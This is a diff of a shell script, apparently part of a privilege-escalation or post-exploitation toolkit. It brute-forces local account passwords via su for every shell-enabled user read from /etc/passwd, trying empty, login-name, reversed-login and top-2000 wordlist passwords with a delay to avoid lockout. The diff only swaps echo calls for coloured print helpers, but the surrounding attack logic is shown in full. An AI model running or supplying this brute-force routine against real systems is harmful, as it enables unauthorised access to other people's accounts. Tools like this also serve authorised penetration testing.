@@ -36,17 +36,17 @@ su_brute()
     SU_USER=$1 # empty, login, reverse login + whatever wordlist
 
     if su_try "$SU_USER" ""; then
-        echo "empty pass"
+        print_red "empty pass"
         return 0
     fi	
 
     if su_try "$SU_USER" "$SU_USER"; then
-        echo "login:login for $SU_USER"
+        print_red "login:login for $SU_USER"
         return 0
     fi	
 
     if su_try "$SU_USER" "$(echo $SU_USER | rev 2>/dev/null)"; then
-        echo "login:revlogin for $SU_USER"
+        print_red "login:revlogin for $SU_USER"
         return 0
     fi
 
@@ -54,11 +54,11 @@ su_brute()
     do
         TEMP_PASSWD=$(echo $top2000 | cut -d ' ' -f $i_num)
         if su_try "$SU_USER" "$TEMP_PASSWD"; then
-            echo "passwd found"
+            print_red "passwd found"
             return 0
         fi 
 	if (($i_num % 200 == 0)); then
-		echo "$i_num step rn"
+		small_print "$i_num step rn, it's not locked"
 	fi
         sleep 0.05
 	#	break
@@ -83,7 +83,7 @@ if [ "$CHECK" ];
     SHELLERS=$(cat /etc/passwd 2>/dev/null | grep -i "sh$" | cut -d ":" -f 1)
     printf "%s\n" "$SHELLERS" | while read us;
     do
-        echo " Bruteforcing user $us..."
+        small_print " Bruteforcing user $us..."
         su_brute "$us"
     done
 
